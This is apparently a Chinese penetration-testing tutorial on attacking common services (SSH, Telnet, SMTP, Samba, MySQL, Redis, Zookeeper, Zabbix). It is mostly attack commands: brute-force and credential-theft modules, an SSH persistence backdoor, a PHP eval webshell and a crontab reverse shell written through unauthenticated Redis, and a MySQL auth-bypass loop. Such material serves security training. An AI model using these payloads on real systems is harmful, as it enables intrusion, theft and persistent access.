","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:1","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"端口扫描 nmap nmap -sV -p 22 IP msf auxiliary/scanner/ssh/ssh_version ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:2","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"密码破解 msf use auxiliary/scanner/ssh/ssh_login set stop_on_success true ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:3","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SSH 用户代码执行 msf use exploit/multi/ssh/sshexec ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:4","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"使用 RSA 密钥建立 SSH 连接 配置： ssh-keygen cd /home/kali/.ssh ls cat id_rsa.pub \u003e authorized_keys scp msfadmin@ip:/home/msfadmin/.ssh/id_rsa ./ sudo vim /etc/ssh/sshd_config PasswordAuthentication no sudo /etc/init.d/ssh restart 连接： ssh -i id_rsa username@ip ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:5","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"窃取 SSH 密钥 已获得 meterpreter 会话，窃取 SSH 密钥 use auxiliary/scanner/ssh/ssh_login 获取会话 use post/multi/gather/ssh_creds set session 1 run ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:6","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SSH 密钥持久性后门 已获得 meterpreter 会话，留下 SSH 密钥持久性后门 use auxiliary/scanner/ssh/ssh_login 获取会话 use post/linux/manager/sshkey_persistence set session 1 run ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:7","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"防御 修改默认端口 sudo vim /etc/ssh/sshd_config port 22222 sudo /etc/init.d/ssh restart ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:2:8","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Telnet 漏洞 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:3:0","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"telnet 简介 Telnet 协议是 TCP/IP 协议族中的一员，是 Internet 远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用 telnet 程序，用它连接到服务器。终端使用者可以在 telnet 程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个 telnet 会话，必须输入用户名和密码来登录服务器。Telnet 是常用的远程控制 Web 服务器的方法。 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:3:1","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"banner 信息 /etc/issue.net msf use auxiliary/scanner/telnet/telnet_version ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:3:2","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"修改默认端口 /etc/services sudo /etc/init.d/xinetd restart ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:3:3","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"通过嗅探窃取凭据 明文传输，可以嗅探 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:3:4","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"暴力破解 hydra hydra -v -L user.txt -P pass.txt telnet://IP msf use auxiliary/scanner/telnet/telnet_login set rhost set stop_on_success true set user_file user.txt set pass_file pass.txt run ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:3:5","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"保护 telnet 免受暴力攻击 将允许来自 IP 地址 192.168.1.1 的流量访问端口 23 上的 telnet 服务 sudo iptables -A INPUT -s 192.168.1.1 -p tcp --dport 23 -j ACCEPT drop 掉来自端口 23 上其它 IP 地址的流量 sudo iptables -A INPUT -p tcp --dport 23 -j DROP ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:3:6","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SMTP 漏洞 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:4:0","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SMTP 简介 SMTP 是一种提供可靠且有效的电子邮件传输的协议。SMTP 是建立在 FTP 文件传输服务上的一种邮件服务，主要用于系统之间的邮件信息传递，并提供有关来信的通知。SMTP 独立于特定的传输子系统，且只需要可靠有序的数据流信道支持，SMTP 的重要特性之一是其能跨越网络传输邮件，即 SMTP邮件中继 。使用 SMTP，可实现相同网络处理进程之间的邮件传输，也可通过中继器或网关实现某处理进程与其他网络之间的邮件传输。 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:4:1","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SMTP 命令和返回码 MAIL FROM 指定发件人地址 RCPT TO 指定单个的邮件接收人：可能有多个 RCPT TO；常在 MAIL FROM 命令之后 VRFY 用于指定用户/邮箱是否存在；由于安全原因，服务器常禁止此命令 EXPN 验证给定的邮箱列表是否存在，也常被禁用 返回码 250：要求邮件操作完成 500：要求邮件操作未完成，邮箱不可用（例如，邮箱未找到，或不可访问） ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:4:2","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Postfix 简介 postfix 是 ubuntu 的默认邮件传输代理（MTA） http://www.postfix.org ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:4:3","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SMTP 用户枚举 Ubuntu 系统用户就是 postfix 用户 telnet Smtp-user-enum msf 手动枚举 SMTP 用户 telnet VERY ftp MAIL FROM:ftp + RCPT TO:ftp SMTP-user-enum apt-get install smtp-user-enum smtp-user-enum -M VRFY -u root -t 202.38.xxx.xxx smtp-user-enum -M VRFY -U dic.txt -t 202.38.xxx.xxx smtp-user-enum -M RCPT -u bin -t 202.38.xxx.xxx smtp-user-enum -M EXPN -u bin -t 202.38.xxx.xxx msf auxiliary/scanner/smtp/smtp_enum ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:4:4","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"暴力破解 hydra hydra -l msfadmin -P passwd.txt smtp://IP ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:4:5","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Samba 漏洞 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:5:0","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Samba 简介 Samba 是在 Linux 和 UNIX 系统上实现 SMB 协议的一个免费软件，由服务器及客户端程序构成。 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:5:1","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SMB 简介 SMB(Server Messages Block，信息服务块)是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。 SMB协议是客户机/服务器型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。通过设置 NetBIOS over TCP/IP 使得 Samba 不但能与局域网络主机分享资源，还能与全世界的电脑分享资源。 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:5:2","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SMB 信息泄露 msf auxiliary/scanner/smb/smb_version nmap nmap -sV -p 445 IP nmap -sV -v -p 445 --script=smb-vuln* nmblookup nmblookup 用于查询 NetBIOS 名称，并使用基于 TCP/IP 的 NetBIOS 查询将它们映射到网络中的 IP 地址。这些选项允许将名称查询定向到特定的 IP 广播区域或特定的机器。所有查询都通过 UDP 完成。 nmblookup 是用于枚举域/工作站和 MAC 地址的有用命令 nmblookup -A 192.168.1.139 nbtscan 扫描在本地或远程 TCP/IP 网络上 NetBIOS 打开的名称服务器，因为这是查找打开共享的第一步 可以在整个子网中工作，而不是在单个 IP 上工作 nbtscan 192.168.1.1/24 SMBMap SMBMap 允许用户枚举整个域中的 samba 共享驱动器。列出共享驱动器，驱动器权限，共享内容，上载/下载功能，文件名自动下载模式匹配，甚至执行远程命令。旨在简化大型网络中潜在敏感数据的搜索。 smbmap -H 192.168.1.139 smbmap -H 192.168.1.139 -u msfadmin -p msfadmin ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:5:3","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"暴力破解 hydra hydra -L user.txt -P pass.txt -v smb://ip ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:5:4","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"命令执行 search smb 3.0.20 use exploit/multi/samba/usermap_script ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:5:5","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Zookeeper ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:6:0","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Zookeeper 简介 Zookeeper 是一个分布式服务框架，是 Apache Hadoop 的一个子项目，它主要是用来解决分布式应用中经常遇到的一些数据管理问题，如：统一命名服务、状态同步服务、集群管理、分布式应用配置项的管理等。 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:6:1","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"环境搭建 wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz tar -xzvf zookeeper-3.4.14.tar.gz mv zoo_sample.cfg zoo.cfg ./zkServer.sh start ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:6:2","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"未授权访问 Zookeeper 默认未设置密码，在未进行任何访问控制情况下，攻击者可通过执行 env 命令获得系统大量的敏感信息，包括系统名称、Java 环境。 Zookeeper 默认端口开启在 2181 端口 netstat -an | grep 2181 nmap -sV -p 2181 IP nc IP 2181 envi 打印有关服务环境的详细信息 stat 列出关于性能和连接客户端的统计信息 ruok 测试服务器是否运行在非错误状态 reqs 列出未完成的请求 dump 列出未完成的会话和临时节点 图形化界面工具： ZooInspector ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:6:3","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Mysql 漏洞 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:7:0","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Mysql 简介 Mysql 数据库是目前世界上使用最为广泛的数据库之一，很多著名公司和站点都使用Mysql 作为其数据库支撑 目前很多架构都以 Mysql 作为数据库管理系统，例如 LAMP、和 WAMP 等 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:7:1","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Mysql 信息收集 版本信息 nmap: nmap -sV -p 3306 IP msf: use auxiliary/scanner/mysql/mysql_version 其它相关信息 use auxiliary/admin/mysql/mysql_enum ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:7:2","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Mysql 密码破解 hydra hydra -L user.txt -P password.txt -v mysql://IP msf use auxiliary/scanner/mysql/mysql_login ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:7:3","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Mysql 漏洞利用 MySQL 身份认证漏洞(CVE-2012-2122) https://seclists.org/oss-sec/2012/q2/493 memcmp() 的返回值都在[127，-128]之内，把两个字符串逐个字符的比较，如果找到不一样的，就把这两个字符相减后返回 memcmp()返回 0 的时候 check_scramble() 认证通过 漏洞利用 msf： use auxiliary/scanner/mysql/mysql_authbypass_hashdump Linux shell: for i in `seq 1 1000`;do mysql -uroot -pwrong -h IP -P3306;done ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:7:4","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Redis ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:8:0","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"redis 简介 Redis是大家常说的非关系型数据库中的一种，是一个开源的使用 ANSI 语言编写、支持网络可基于内存亦可持久化的日志型、Key-Value 数据库，并提供多种语言的API Redis 与 memcached 一样，为了保证效率，数据都是缓存在内存中。但 Redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave (主从)同步。 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:8:1","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"redis 未授权访问漏洞 默认的配置是使用 6379 端口，没有密码。这时候会导致未授权访问读写 Redis 数据。 在 web 目录下写入 Webshell config set dir /var/www/html config set dbfilename webshell.php set webshell \"\u003c?php phpinfo();?\u003e\" save 当数据库过大时，redis 写 shell 的小技巧： \u003c?php set_time_limit(0); $fp=fopen('webshell.php','w'); fwrite($fp,'\u003c?php @eval($_POST[1]);?\u003e'); exit(); ?\u003e 写 ssh 公钥 ssh-keygen -t rsa cd .ssh (echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") \u003e 1.txt cat 1.txt | redis-cli -h ip -x set payload config set dir /root/.ssh config set dbfilename authorized_keys save 写 crontab redis-cli -h 192.168.0.104 set xxx \"\\n\\n*/1 * * * * /bin/bash -i\u003e\u0026/dev/tcp/192.168.0.104/4444 0\u003e\u00261\\n\\n\" config set dir /var/spool/cron config set dbfilename root save ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:8:2","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"利用 redis 主从复制 rce https://geekby.xyz/2019/07/15/redis-ji-yu-zhu-cong-fu-zhi-de-rce-li-yong-fang-shi/ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:8:3","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Zabbix 漏洞 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:9:0","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Zabbix 简介 Zabbix 是由 Alexei Vladishev 开发的一种网络监视、管理系统，基于 ServerClient 架构。可用于监视各种网络服务、服务器和网络机器等状态。 使用各种 Database-end 如：MySQL，PostgreSQL，SQLite，Oracle IBM DB2 储存资料。Server 端基于 C 语言、Web管理端 frontend 则是基于 PHP 所制作的。Zabbix 可以使用多种方式监视。可以只使用 Simple Check 不需要安装 client 端，亦可基于 SMTP 或 HTTP 各种协定做死活监视。 在客户端如 UNIX， Windows 中安装 Zabbix Agent 之后，可监视 CPU Load、网络使用状况、硬盘容量等各种状态。而就算没有安装 Agent 在监视对象中，Zabbix 也可以经由 SNMP、TCP、IMP、利用 PMI、SSH、 telnet 对目标进行监视。 另外， Zabbix 包含 XMPP 等各种 Item 警示功能 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:9:1","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Zabbix SQL 注入漏洞 https://geekby.xyz/2019/03/01/zabbix-latest.php-sql-zhu-ru-lou-dong/ ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:9:2","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Zabbix 命令执行利用 管理员在安装配置 Zabbix 过程中，使用了弱口令或默认的用户名与口令。如：Admin/zabbix，这样，Zabbix服务器的用户认证就形同虚设。攻击者可以创建 system.run[command,] 监控项执行命令，甚至获取服务器 shell，进行各种挖矿行为。 https://www.jianshu.com/p/675b6385b7c0 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:9:3","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Elasticsearch 漏洞 ","date":"2020-05-13","objectID":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/:10:0","tags":["渗透测试","服务漏洞"],"title":"常见服务类漏洞","uri":"/2020/05/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Elasticsearch 简介 Elasticsearch 是一个分布式、高扩展、高实时的搜索与数据分析引擎。它能很方便的使大量数据具有搜索、分析和探索的能力。充分利用 Elasticsearch 的水平伸缩性，能使数据在生产环境变得更有价值。 Elasticsearch 的实现原理主要分为以下几个步骤，首先用户将数据提交到 Elasticsearch 数据库中，再通过分词控制器去将对应的语句分词，将其权重和分词结果一并存入数据，当用户搜索数据时候，再根据权重将结果排名，打分，再将返回结果呈现给用户。 